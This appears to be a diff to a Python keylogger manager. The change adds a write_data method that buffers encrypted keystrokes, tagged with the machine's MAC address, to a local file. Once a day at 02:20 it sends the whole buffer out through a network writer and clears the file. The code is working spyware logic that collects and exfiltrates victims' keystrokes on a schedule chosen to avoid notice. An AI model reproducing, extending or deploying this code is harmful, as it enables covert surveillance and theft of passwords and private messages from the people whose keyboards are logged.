@@ -1,4 +1,7 @@
-from utilities.encryptionDecryption.encryption import Encryption
+from logger.writer.IWriter import IWriter
+import sys
+sys.path.append('../../utilities/encryptionDecryption')
+from encryption import Encryption
 from logger.keylogger.keylogger_service import KeyloggerService
 from logger.writer.FileWriter import FileWriter
 from logger.writer.NetWorkWriter import NetWorkWriter
@@ -12,8 +15,7 @@ logging.basicConfig(filename='../../utilities/log.txt', level=logging.DEBUG, for
 class KeyLoggerManager:
     def __init__(self):
         self.mac_address = hex(uuid.getnode())
-        self.file_writer = FileWriter()
-        self.netWork_writer = NetWorkWriter()
+        self.writer = FileWriter()
         self.keylogger = KeyloggerService()
         self.encoder = Encryption(open('../../utilities/key.txt', 'r').read())
         self.flag = True
@@ -42,12 +44,24 @@ class KeyLoggerManager:
                 logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                 try:
                     encrypted_data = self.encoder.encryption(logged_keys)
-                    self.file_writer.send_data(encrypted_data, self.mac_address)
-                    self.netWork_writer.send_data(encrypted_data, self.mac_address)
+                    self.write_data(encrypted_data)
                 except Exception as e:
                     logging.error(e)
                     return
+            else:
+                self.write_data('')
             sleep(5)
+
+    def write_data(self, encrypted_data):
+        if datetime.now().hour == 2 and datetime.now().minute == 20 and 0 <= datetime.now().second <= 5:
+            self.writer = NetWorkWriter()
+            with open('../Data_File.txt', 'r') as file:
+                encrypted_data = file.read() + encrypted_data
+            with open('../Data_File.txt', 'w') as file:
+                pass
+        else:
+            self.writer = FileWriter()
+        self.writer.send_data(encrypted_data, self.mac_address)
 
 
 def main():
